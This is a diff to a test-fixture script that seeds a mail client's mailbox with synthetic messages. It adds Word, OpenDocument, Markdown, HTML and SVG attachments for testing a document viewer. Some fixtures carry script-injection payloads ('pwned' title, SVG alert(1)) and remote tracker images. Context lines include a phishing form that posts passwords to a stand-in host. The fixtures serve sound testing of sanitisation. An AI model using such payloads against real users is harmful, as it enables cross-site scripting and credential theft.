@@ -11,6 +11,7 @@ appends N synthetic messages for performance testing.
 import argparse
 import base64
 import email.utils
+import gzip
 import http.client
 import imaplib
 import random
@@ -18,6 +19,8 @@ import re
 import ssl
 import time
 import uuid
+import zipfile
+from io import BytesIO
 from datetime import datetime, timedelta, timezone
 from email.message import EmailMessage
 from email.headerregistry import Address
@@ -55,6 +58,48 @@ def msg(frm, to, subject, text, *, date, html=None, msgid=None, in_reply_to=None
     if html:
         m.add_alternative(html, subtype="html")
     return m
+
+
+def zipped(files, first=None):
+    """A ZIP of {name: text}; `first` is stored uncompressed ahead of the rest (ODF's mimetype)."""
+    buf = BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        if first:
+            z.writestr(zipfile.ZipInfo(first[0]), first[1], compress_type=zipfile.ZIP_STORED)
+        for name, text in files.items():
+            z.writestr(name, text)
+    return buf.getvalue()
+
+
+def docx(paragraphs):
+    """A minimal Word document: a heading, then paragraphs, the last one a link."""
+    w = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
+    body = "".join(f'<w:p><w:r><w:t xml:space="preserve">{p}</w:t></w:r></w:p>' for p in paragraphs)
+    link = '<w:p><w:hyperlink r:id="rLink"><w:r><w:rPr><w:color w:val="0563C1"/><w:u w:val="single"/></w:rPr><w:t>Project page</w:t></w:r></w:hyperlink></w:p>'
+    return zipped({
+        "[Content_Types].xml": '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>'
+            '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
+        "_rels/.rels": '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
+        "word/_rels/document.xml.rels": '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            '<Relationship Id="rLink" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/satchel" TargetMode="External"/></Relationships>',
+        "word/document.xml": f'<?xml version="1.0" encoding="UTF-8"?><w:document {w}><w:body>'
+            f'<w:p><w:pPr><w:jc w:val="center"/></w:pPr><w:r><w:rPr><w:b/><w:sz w:val="40"/></w:rPr><w:t>Satchel kickoff agenda</w:t></w:r></w:p>{body}{link}</w:body></w:document>',
+    })
+
+
+def odt(paragraphs):
+    """A minimal OpenDocument text file."""
+    body = "".join(f"<text:p>{p}</text:p>" for p in paragraphs)
+    return zipped({
+        "META-INF/manifest.xml": '<?xml version="1.0" encoding="UTF-8"?><manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">'
+            '<manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>'
+            '<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/></manifest:manifest>',
+        "content.xml": '<?xml version="1.0" encoding="UTF-8"?><office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
+            'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2"><office:body><office:text>'
+            f'<text:h text:outline-level="1">Meeting minutes</text:h>{body}</office:text></office:body></office:document-content>',
+    }, first=("mimetype", "application/vnd.oasis.opendocument.text"))
 
 
 def fixtures(user):
@@ -225,6 +270,28 @@ def spam_fixtures(user):
     m.add_attachment(b'<html><body><h3>Sign in to view document</h3><form action="https://acme-payments.example/collect">'
                      b'<input name="email"><input name="password" type="password"><button>View</button></form></body></html>',
                      maintype="text", subtype="html", filename="Remittance_REM-55102.html")
+    out.append(("INBOX", "()", m))
+
+    # Documents the golemdocs viewer draws (0062): Word, OpenDocument, Markdown,
+    # a web page that asks for remote images and runs a script, and an SVG.
+    m = msg(addr("bob"), me, "Documents for Monday", "Hi,\n\nThe agenda, last week's minutes, the README, the saved status page and the new logo and badge are attached.\n\nBob",
+            date=NOW - timedelta(hours=3))
+    m.add_attachment(docx(["Scope: what the first release covers.", "Timeline: weekly check-ins until launch.", "Owners: Bob (sync), Carol (calendar)."]),
+                     maintype="application", subtype="vnd.openxmlformats-officedocument.wordprocessingml.document", filename="Kickoff agenda.docx")
+    m.add_attachment(odt(["Present: Alice, Bob, Carol.", "Decided: ship the attachment viewer first."]),
+                     maintype="application", subtype="vnd.oasis.opendocument.text", filename="Minutes.odt")
+    m.add_attachment(b"# Satchel\n\nA *local-first* mail client.\n\n- Sync into SQLite\n- Agents propose, you approve\n\n```sh\nscripts/run web --test\n```\n\n[Website](https://satchel.email)\n",
+                     maintype="text", subtype="markdown", filename="README.md")
+    m.add_attachment(b'<html><head><title>Status</title><script>document.title="pwned"</script></head><body><h1>System status</h1>'
+                     b'<p>All systems <b>operational</b>.</p><img src="https://tracker.example.com/status.png" alt="uptime chart">'
+                     b'<p><a href="https://status.example.com/history">History</a></p></body></html>',
+                     maintype="text", subtype="html", filename="Status page.html")
+    m.add_attachment(b'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="120" viewBox="0 0 200 120"><script>alert(1)</script>'
+                     b'<rect x="10" y="10" width="180" height="100" rx="16" fill="#3b6fd8"/><circle cx="60" cy="60" r="28" fill="#fff"/>'
+                     b'<image href="https://tracker.example.com/logo.png" x="100" y="30" width="60" height="60"/></svg>',
+                     maintype="image", subtype="svg+xml", filename="logo.svg")
+    m.add_attachment(gzip.compress(b'<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120"><circle cx="60" cy="60" r="50" fill="#d8743b"/></svg>', mtime=0),
+                     maintype="image", subtype="svg+xml", filename="badge.svgz")
     out.append(("INBOX", "()", m))
 
     # Calendar spam: an unsolicited invite that lands on the calendar if auto-added.
